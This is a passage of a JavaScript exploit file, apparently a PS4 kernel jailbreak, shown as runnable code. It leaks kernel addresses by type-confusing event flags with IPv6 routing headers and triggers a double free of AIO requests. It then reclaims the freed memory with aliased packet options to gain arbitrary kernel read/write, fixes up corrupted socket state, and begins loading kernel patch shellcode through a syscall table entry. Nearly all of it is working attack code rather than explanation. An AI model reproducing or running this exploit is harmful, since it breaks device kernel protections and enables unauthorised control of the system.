            if (read16(addr.add(i + 4)) !== 0xffff) {
                heap_prefixes.push(Number(read16(addr.add(i + 4))));
            }
        } else if (i === 0x50 || !read64(addr.add(i)).eq(0)) {
            return false;
        }
    }

    if (heap_prefixes.length < 2) {
        return false;
    }

    const first_prefix = heap_prefixes[0];
    for (var idx = 1; idx < heap_prefixes.length; idx++) {
        if (heap_prefixes[idx] !== first_prefix) {
            return false;
        }
    }

    return true;
}

function leak_kernel_addrs(sd_pair, sds) {
    
    const sd = sd_pair[0];
    const buflen = 0x80 * LEAK_LEN;
    const buf = malloc(buflen);

    log("Confusing evf with rthdr...");

    const name = malloc(1);

    close(sd_pair[1]);

    var evf = null;
    for (var i = 1; i <= NUM_ALIAS; i++) {
        const evfs = [];

        for (var j = 1; j <= NUM_HANDLES; j++) {
            const evf_flags = 0xf00 | (j << 16);
            evfs.push(new_evf(name, evf_flags));
        }

        get_rthdr(sd, buf, 0x80);

        const flag = read32(buf);

        if ((flag & 0xf00) === 0xf00) {
            const idx = (flag >>> 16) & 0xffff;
            const expected_flag = (flag | 1);

            evf = evfs[idx - 1];

            set_evf_flags(evf, expected_flag);
            get_rthdr(sd, buf, 0x80);

            const val = read32(buf);
            if (val === expected_flag) {
                evfs.splice(idx - 1, 1);
            } else {
                evf = null;
            }
        }

        for (var k = 0; k < evfs.length; k++) {
            if (evf === null || evfs[k] !== evf) {
                free_evf(evfs[k]);
            }
        }

        if (evf !== null) {
            log("Confused rthdr and evf at attempt: " + i);
            break;
        }
    }

    if (evf === null) {
        log("Failed to confuse evf and rthdr");
        return null;
    }

    set_evf_flags(evf, 0xff00);

    const kernel_addr = read64(buf.add(0x28));
    log("\"evf cv\" string addr: " + hex(kernel_addr));

    const kbuf_addr = read64(buf.add(0x40)).sub(0x38); // -0x38
    log("Kernel buffer addr: " + hex(kbuf_addr));

    const wbufsz = 0x80;
    const wbuf = malloc(wbufsz);
    const rsize = build_rthdr(wbuf, wbufsz);
    const marker_val = 0xdeadbeef;
    const reqs3_offset = 0x10;

    write32(wbuf.add(4), marker_val);
    write32(wbuf.add(reqs3_offset + 0), 1);                  // .ar3_num_reqs
    write32(wbuf.add(reqs3_offset + 4), 0);                  // .ar3_reqs_left
    write32(wbuf.add(reqs3_offset + 8), AIO_STATE_COMPLETE); // .ar3_state
    write8 (wbuf.add(reqs3_offset + 0xc), 0);                // .ar3_done
    write32(wbuf.add(reqs3_offset + 0x28), 0x67b0000);       // .ar3_lock.lock_object.lo_flags
    write64(wbuf.add(reqs3_offset + 0x38), 1);               // .ar3_lock.lk_lock = LK_UNLOCKED

    const num_elems = 6;
    const ucred = kbuf_addr.add(4);
    const leak_reqs = make_reqs1(num_elems);
    write64(leak_reqs.add(0x10), ucred);

    const num_loop = NUM_SDS;
    const leak_ids_len = num_loop * num_elems;
    const leak_ids = malloc(4 * leak_ids_len);
    const step = (4 * num_elems);
    const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

    var reqs2_off = null;
    var fake_reqs3_off = null;
    var fake_reqs3_sd = null;

    for (var i = 1; i <= NUM_LEAKS; i++) {
        for (var j = 1; j <= num_loop; j++) {
            write32(wbuf.add(8), j);
            aio_submit_cmd(cmd, leak_reqs, num_elems, 3, leak_ids + ((j - 1) * step));
            set_rthdr(sds[j - 1], wbuf, rsize);
        }
        
        get_rthdr(sd, buf, buflen);

        var sd_idx = null;
        reqs2_off = null;
        fake_reqs3_off = null;

        for (var off = 0x80; off < buflen; off += 0x80) {
            const offset = off;

            if (reqs2_off === null && verify_reqs2(buf.add(offset), AIO_CMD_WRITE)) {
                reqs2_off = off;
            }

            if (fake_reqs3_off === null) {
                const marker = read32(buf.add(offset + 4));
                if (marker === marker_val) {
                    fake_reqs3_off = off;
                    sd_idx = Number(read32(buf.add(offset + 8)));
                }
            }
        }

        if (reqs2_off !== null && fake_reqs3_off !== null) {
            log("Found reqs2 and fake reqs3 at attempt: " + i);
            fake_reqs3_sd = sds[sd_idx - 1];
            sds.splice(sd_idx - 1, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
        }

        free_aios(leak_ids, leak_ids_len);
    }

    if (reqs2_off === null || fake_reqs3_off === null) {
        log("Could not leak reqs2 and fake reqs3");
        return null;
    }

    log("reqs2 offset: " + hex(reqs2_off));
    log("fake reqs3 offset: " + hex(fake_reqs3_off));

    get_rthdr(sd, buf, buflen);

    log("Leaked aio_entry:");

    var leak_str = "";
    for (var i = 0; i < 0x80; i += 8) {
        if (i % 16 === 0 && i !== 0) leak_str += "\n";
        leak_str += hex(read64(buf.add(reqs2_off + i))) + " ";
    }
    log(leak_str);
    

    const aio_info_addr = read64(buf.add(reqs2_off + 0x18));
    var reqs1_addr = read64(buf.add(reqs2_off + 0x10));
    reqs1_addr = reqs1_addr.and(new BigInt(0xFFFFFFFF, 0xFFFFFF00));
    const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset);

    log("reqs1_addr = " + hex(reqs1_addr));
    log("fake_reqs3_addr = " + hex(fake_reqs3_addr));

    log("Searching for target_id...");


    var target_id = null;
    var to_cancel = null;
    var to_cancel_len = null;

    const errors = malloc(4 * num_elems);

    for (var i = 0; i < leak_ids_len; i += num_elems) {
        aio_multi_cancel(leak_ids + (i * 4), num_elems, errors);
        get_rthdr(sd, buf, buflen);

        const state = read32(buf.add(reqs2_off + 0x38));
        if (state === AIO_STATE_ABORTED) {
            target_id = read32(leak_ids.add(i * 4));
            write32(leak_ids.add(i * 4), 0);

            log("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));

            const start = i + num_elems;
            to_cancel = leak_ids + start * 4;
            to_cancel_len = leak_ids_len - start;

            break;
        }
    }

    if (target_id === null) {
        log("Target ID not found");

        return null;
    }

    cancel_aios(to_cancel, to_cancel_len);
    free_aios2(leak_ids, leak_ids_len);

    log("Kernel addresses leaked successfully!");

    return {
        reqs1_addr: reqs1_addr,
        kbuf_addr: kbuf_addr,
        kernel_addr: kernel_addr,
        target_id: target_id,
        evf: evf,
        fake_reqs3_addr: fake_reqs3_addr,
        fake_reqs3_sd: fake_reqs3_sd,
        aio_info_addr: aio_info_addr
    };
}

// Stage 3

kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? (value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return (value[0]) | ((value[1]) << 8);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    var result = 0;
    for (var i = 0; i < 4; i++) {
        result |= ((value[i]) << (i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    var result_hi = 0;
    var result_low = 0;
    for (var i = 0; i < 4; i++) {
        result_hi |= ((value[i+4]) << (i * 8));
        result_low |= ((value[i]) << (i * 8));
    }
    var result = new BigInt(result_hi, result_low);
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    var result = "";

    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;

        var null_pos = -1;
        for (var i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }

        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(var i = 0; i < null_pos; i++) {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }

        for(var i = 0; i < chunk.length; i++) {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr.add(chunk.length);
    }

    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFF);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFF);
    buf[1] = Number((value >> 8) & 0xFF);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (var i = 0; i < 4; i++) {
        buf[i] = Number((value >> (i * 8)) & 0xFF);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    value = value instanceof BigInt ? value : new BigInt(value);

    var val_hi = value.hi;
    var val_low = value.lo;

    for (var i = 0; i < 4; i++) {
        buf[i] = Number((val_low >> (i * 8))) & 0xFF;
        buf[i+4] = Number((val_hi >> ((i+4) * 8))) & 0xFF;
    }
    kernel.write_buffer(dest, buf);
};

// IPv6 kernel r/w primitive
ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;

    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    // PS4: ofiles is at offset 0x0, each entry is 0x8 bytes

    // Just in case fd is a bigint
    fd = Number(fd);

    const filedescent_addr = ipv6_kernel_rw.ofiles.add(fd * kernel_offset.SIZEOF_OFILES);
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr.add(0x0));
    return ipv6_kernel_rw.kread8(file_addr.add(0x0));
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const pipe = create_pipe();
    const read_fd = pipe[0];
    const write_fd = pipe[1];

    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);

    write64(pktinfo_size_store, 0x14);

    const master_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14);
    setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14);

    const master_so =       ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb =      ipv6_kernel_rw.kread8(master_so.add(kernel_offset.SO_PCB));
    const master_pktopts =  ipv6_kernel_rw.kread8(master_pcb.add(kernel_offset.INPCB_PKTOPTS));

    const slave_so =        ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb =       ipv6_kernel_rw.kread8(slave_so.add(kernel_offset.SO_PCB));
    const slave_pktopts =   ipv6_kernel_rw.kread8(slave_pcb.add(kernel_offset.INPCB_PKTOPTS));

    ipv6_kernel_rw.kwrite8(master_pktopts.add(0x10), slave_pktopts.add(0x10));

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64(ipv6_kernel_rw.data.master_target_buffer.add(0x8), 0);
    write32(ipv6_kernel_rw.data.master_target_buffer.add(0x10), 0);
    setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
    if (kaddr === null || kaddr === undefined ||
        uaddr === null || uaddr === undefined ||
        len === null || len === undefined || len === 0) {
        throw new Error("copyout: invalid arguments");
    }

    write64(ipv6_kernel_rw.data.pipemap_buffer, new BigInt(0x40000000, 0x40000000));
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000));
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0);
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer);

    read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
    if (kaddr === null || kaddr === undefined ||
        uaddr === null || uaddr === undefined ||
        len === null || len === undefined || len === 0) {
        throw new Error("copyin: invalid arguments");
    }

    write64(ipv6_kernel_rw.data.pipemap_buffer, 0);
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000));
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0);
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer);

    write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    var mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }

    ipv6_kernel_rw.copyout(kaddr, mem, new BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, new BigInt(buf.length));
};

// Helper functions
function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    var proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0) {
        const proc_name = kernel.read_null_terminated_string(proc.add(kernel_offset.PROC_COMM));
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc.add(0x0));
    }

    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    const target_pid = Number(pid);
    var proc = kernel.read_qword(kernel.addr.allproc);
    while (!proc.eq(0)) {
        const proc_pid = kernel.read_dword(proc.add(kernel_offset.PROC_PID));
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc.add(0));
    }

    return null;
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        buffer[i] = Number(read8(addr.add(i)));
    }
    return buffer;
}

function read_cstring(addr) {
    var str = "";
    var i = 0;
    while (true) {
        const c = Number(read8(addr.add(i)));
        if (c === 0) break;
        str += String.fromCharCode(c);
        i++;
        if (i > 256) break; // Safety limit
    }
    return str;
}

function write_buffer(addr, buffer) {
    for (var i = 0; i < buffer.length; i++) {
        write8(addr.add(i), buffer[i]);
    }
}

function make_aliased_pktopts(sds) {
    const tclass = malloc(4);
    
    for (var loop = 0; loop < NUM_ALIAS; loop++) {
        for (var i = 0; i < sds.length; i++) {
            write32(tclass, i);
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
        }
        
        for (var i = 0; i < sds.length; i++) {
            get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = Number(read32(tclass));
            
            if (marker !== i) {
                const sd_pair = [sds[i], sds[marker]];
                log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                if (marker > i) {
                    sds.splice(marker, 1);
                    sds.splice(i, 1);
                } else {
                    sds.splice(i, 1);
                    sds.splice(marker, 1);
                }
                
                for (var j = 0; j < 2; j++) {
                    const sock_fd = new_socket();
                    set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    sds.push(sock_fd);
                }
                
                return sd_pair;
            }
        }
        
        for (var i = 0; i < sds.length; i++) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
    }
    
    return null;
}

function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
    const max_leak_len = (0xff + 1) << 3;
    const buf = malloc(max_leak_len);
    
    const num_elems = MAX_AIO_IDS;
    const aio_reqs = make_reqs1(num_elems);
    
    const num_batches = 1;
    const aio_ids_len = num_batches * num_elems;
    const aio_ids = malloc(4 * aio_ids_len);
    
    log("Overwriting rthdr with AIO queue entry...");
    var aio_not_found = true;
    free_evf(evf);
    
    for (var i = 0; i < NUM_CLOBBERS; i++) {
        spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
        
        const size_ret = get_rthdr(sd, buf, max_leak_len);
        const cmd = read32(buf);
        
        if (size_ret === 8 && cmd === AIO_CMD_READ) {
            log("Aliased at attempt " + i);
            aio_not_found = false;
            cancel_aios(aio_ids, aio_ids_len);
            break;
        }
        
        free_aios(aio_ids, aio_ids_len, true);
    }
    
    if (aio_not_found) {
        log("Failed to overwrite rthdr");
        return null;
    }
    
    const reqs2_size = 0x80;
    const reqs2 = malloc(reqs2_size);
    const rsize = build_rthdr(reqs2, reqs2_size);   
    
    write32(reqs2.add(4), 5);                   // ar2_ticket
    write64(reqs2.add(0x18), reqs1_addr);       // ar2_info
    write64(reqs2.add(0x20), fake_reqs3_addr);  // ar2_batch
    
    const states = malloc(4 * num_elems);
    const addr_cache = [];
    for (var i = 0; i < num_batches; i++) {
        addr_cache.push(aio_ids.add(i * num_elems * 4));
    }
    
    log("Overwriting AIO queue entry with rthdr...");

    close(sd);
    sd = null;
    
    function overwrite_aio_entry_with_rthdr() {

        for (var i = 0; i < NUM_ALIAS; i++) {
            for (var j = 0; j < sds.length; j++) {
                set_rthdr(sds[j], reqs2, rsize);
            }
            //log("before for batch = 0 ...")
            for (var batch = 0; batch < addr_cache.length; batch++) {
                for (var j = 0; j < num_elems; j++) {
                    write32(states.add(j * 4), 0xFFFFFFFF);
                }

                aio_multi_cancel_fun(addr_cache[batch], num_elems, states);
                
                var req_idx = -1;
                for (var j = 0; j < num_elems; j++) {
                    const val = read32(states.add(j * 4));
                    if (val === AIO_STATE_COMPLETE) {
                        req_idx = j;
                        break;
                    }
                }

                if (req_idx !== -1) {
                    log("Found req_id at batch " + batch + ", attempt " + i);
                    const aio_idx = batch * num_elems + req_idx;
                    const req_id_p = aio_ids.add(aio_idx * 4);
                    const req_id = read32(req_id_p);
                    
                    aio_multi_poll_fun(req_id_p, 1, states);
                    write32(req_id_p, 0);
                    return req_id;
                }
            }
        }

        return null;
    }
    
    const req_id = overwrite_aio_entry_with_rthdr();
    if (req_id === null) {
        log("Failed to overwrite AIO queue entry");
        return null;
    }
    
    free_aios2(aio_ids, aio_ids_len);
    
    const target_id_p = malloc(4);
    write32(target_id_p, target_id);
    
    aio_multi_poll_fun(target_id_p, 1, states);
    
    const sce_errs = malloc(8);
    write32(sce_errs, 0xFFFFFFFF); // -1
    write32(sce_errs.add(4), 0xFFFFFFFF); // -1
    
    const target_ids = malloc(8);
    write32(target_ids, req_id);
    write32(target_ids.add(4), target_id);
    
    log("Triggering double free...");
    aio_multi_delete_fun(target_ids, 2, sce_errs);
    
    log("Reclaiming memory...");
    
    const sd_pair = make_aliased_pktopts(sds_alt);
    
    const err1 = read32(sce_errs);
    const err2 = read32(sce_errs.add(4));
    
    write32(states, 0xFFFFFFFF); // -1
    write32(states.add(4), 0xFFFFFFFF); // -1
    
    aio_multi_poll_fun(target_ids, 2, states);
    
    var success = true;
    if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
        log("ERROR: Bad delete of corrupt AIO request");
        success = false;
    }
    
    if (err1 !== 0 || err1 !== err2) {
        log("ERROR: Bad delete of ID pair");
        success = false;
    }
    
    if (!success) {
        log("Double free failed");
        return null;
    }
    
    if (sd_pair === null) {
        log("Failed to make aliased pktopts");
        return null;
    }
    
    return sd_pair;
}

// Stage 4

function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
    try {
        const master_sock = pktopts_sds[0];
        const tclass = malloc(4);
        const off_tclass = kernel_offset.IP6PO_TCLASS;
        
        const pktopts_size = 0x100;
        const pktopts = malloc(pktopts_size);
        const rsize = build_rthdr(pktopts, pktopts_size);
        const pktinfo_p = reqs1_addr.add(0x10);
        
        // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
        write64(pktopts.add(0x10), pktinfo_p);
        
        log("Overwriting main pktopts");
        var reclaim_sock = null;
        
        close(pktopts_sds[1]);
        
        for (var i = 1; i <= NUM_ALIAS; i++) {
            for (var j = 0; j < sds_alt.length; j++) {
                write32(pktopts.add(off_tclass), 0x4141 | (j << 16));
                set_rthdr(sds_alt[j], pktopts, rsize);
            }
            
            get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = read32(tclass);
            if ((marker & 0xffff) === 0x4141) {
                log("Found reclaim socket at attempt: " + i);
                const idx = Number(marker >> 16);
                reclaim_sock = sds_alt[idx];
                sds_alt.splice(idx, 1);
                break;
            }
        }
        
        if (reclaim_sock === null) {
            log("Failed to overwrite main pktopts");
            return null;
        }
        
        const pktinfo_len = 0x14;
        const pktinfo = malloc(pktinfo_len);
        write64(pktinfo, pktinfo_p);
        
        const read_buf = malloc(8);
        
        function slow_kread8(addr) {
            const len = 8;
            var offset = 0;
            
            while (offset < len) {
                // pktopts.ip6po_nhinfo = addr + offset
                write64(pktinfo.add(8), addr.add(offset));
                
                set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf.add(offset), len - offset);
                
                if (n === 0) {
                    write8(read_buf.add(offset), 0);
                    offset = offset + 1;
                } else {
                    offset = offset + Number(n);
                }
            }
            
            return read64(read_buf);
        }
        
        const test_read = slow_kread8(kernel_addr);
        log("slow_kread8(\"evf cv\"): " + hex(test_read));
        const kstr = read_cstring(read_buf);
        log("*(\"evf cv\"): " + kstr);
        
        if (kstr !== "evf cv") {
            log("Test read of \"evf cv\" failed");
            return null;
        }
        
        log("Slow arbitrary kernel read achieved");
        
        // Get curproc from previously freed aio_info
        const curproc = slow_kread8(aio_info_addr.add(8));
        
        if (Number(curproc.shr(48)) !== 0xffff) {
            log("Invalid curproc kernel address: " + hex(curproc));
            return null;
        }
        
        const possible_pid = Number(slow_kread8(curproc.add(kernel_offset.PROC_PID)));
        const current_pid = Number(getpid());
        
        if ((possible_pid & 0xffffffff) !== (current_pid & 0xffffffff)) {
            log("curproc verification failed: " + hex(curproc));
            return null;
        }
        
        log("curproc = " + hex(curproc));
        
        kernel.addr.curproc = curproc;
        kernel.addr.curproc_fd = slow_kread8((kernel.addr.curproc).add(kernel_offset.PROC_FD));
        kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd).add(kernel_offset.FILEDESC_OFILES);
        kernel.addr.inside_kdata = kernel_addr;
        
        function get_fd_data_addr(sock, kread8_fn) {
            const filedescent_addr = (kernel.addr.curproc_ofiles).add(Number(sock) * kernel_offset.SIZEOF_OFILES);
            const file_addr = kread8_fn(filedescent_addr.add(0));
            return kread8_fn(file_addr.add(0));
        }
        
        function get_sock_pktopts(sock, kread8_fn) {
            const fd_data = get_fd_data_addr(sock, kread8_fn);
            const pcb = kread8_fn(fd_data.add(kernel_offset.SO_PCB));
            const pktopts = kread8_fn(pcb.add(kernel_offset.INPCB_PKTOPTS));
            return pktopts;
        }
        
        const worker_sock = new_socket();
        const worker_pktinfo = malloc(pktinfo_len);

        // Create pktopts on worker_sock
        set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);

        const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
        
        write64(pktinfo, worker_pktopts.add(0x10));   // overlap pktinfo
        write64(pktinfo.add(8), 0);                   // clear .ip6po_nexthop

        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);

        function kread20(addr, buf) {
            write64(pktinfo, addr);
            set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
            get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
        }
        
        function kwrite20(addr, buf) {
            write64(pktinfo, addr);
            set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
            set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
        }
        
        function kread8(addr) {
            kread20(addr, worker_pktinfo);
            return read64(worker_pktinfo);
        }
        
        // Note: this will write our 8 bytes + remaining 12 bytes as null
        function restricted_kwrite8(addr, val) {
            write64(worker_pktinfo, val);
            write64(worker_pktinfo.add(8), 0);
            write32(worker_pktinfo.add(16), 0);
            kwrite20(addr, worker_pktinfo);
        }

        write64(read_buf, kread8(kernel_addr));

        const kstr2 = read_cstring(read_buf);
        if (kstr2 !== "evf cv") {
            log("Test read of \"evf cv\" failed");
            return null;
        }
        
        log("Restricted kernel r/w achieved");
        
        // Initialize ipv6_kernel_rw with restricted write
        ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
        
        kernel.read_buffer = ipv6_kernel_rw.read_buffer;
        kernel.write_buffer = ipv6_kernel_rw.write_buffer;
        kernel.copyout = ipv6_kernel_rw.copyout;
        kernel.copyin = ipv6_kernel_rw.copyin;  
        
        const kstr3 = kernel.read_null_terminated_string(kernel_addr);
        if (kstr3 !== "evf cv") {
            log("Test read of \"evf cv\" failed");
            return null;
        }
        
        log("Arbitrary kernel r/w achieved!");
        
        // RESTORE: clean corrupt pointers
        const off_ip6po_rthdr = kernel_offset.IP6PO_RTHDR;

        for (var i = 0; i < sds.length; i++) {
            const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
            kernel.write_qword(sock_pktopts.add(off_ip6po_rthdr), 0);
        }

        const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);

        kernel.write_qword(reclaimer_pktopts.add(off_ip6po_rthdr), 0);
        kernel.write_qword(worker_pktopts.add(off_ip6po_rthdr), 0);
        
        const sock_increase_ref = [
            ipv6_kernel_rw.data.master_sock,
            ipv6_kernel_rw.data.victim_sock,
            master_sock,
            worker_sock,
            reclaim_sock
        ];
        
        // Increase ref counts to prevent deallocation
        for (each of sock_increase_ref) {
            const sock_addr = get_fd_data_addr(each, kernel.read_qword);
            kernel.write_dword(sock_addr.add(0x0), 0x100);  // so_count
        }
        
        log("Fixes applied");
        
        return true;
        
    } catch (e) {
        log("make_kernel_arw error: " + e.message);
        log(e.stack);
        return null;
    }
}

// Stage 5

// Apply kernel patches via kexec using a single ROP chain
// This avoids returning to JS between critical operations
function apply_kernel_patches(fw_version) {
    try {
        // Get shellcode for this firmware
        const shellcode = get_kpatch_shellcode(fw_version);
        if (!shellcode) {
            log("No kernel patch shellcode for FW " + fw_version);
            return false;
        }

        log("Kernel patch shellcode: " + shellcode.length + " bytes");

        // Constants
        const PROT_READ = 0x1;
        const PROT_WRITE = 0x2;
        const PROT_EXEC = 0x4;
        const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;

        const mapping_addr = new BigInt(0x9, 0x26100000);  // Different from 0x920100000 to avoid conflicts
        const aligned_memsz = 0x10000;

        // Get sysent[661] address and save original values
        const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661);
        log("sysent[661] @ " + hex(sysent_661_addr));

        const sy_narg = kernel.read_dword(sysent_661_addr);
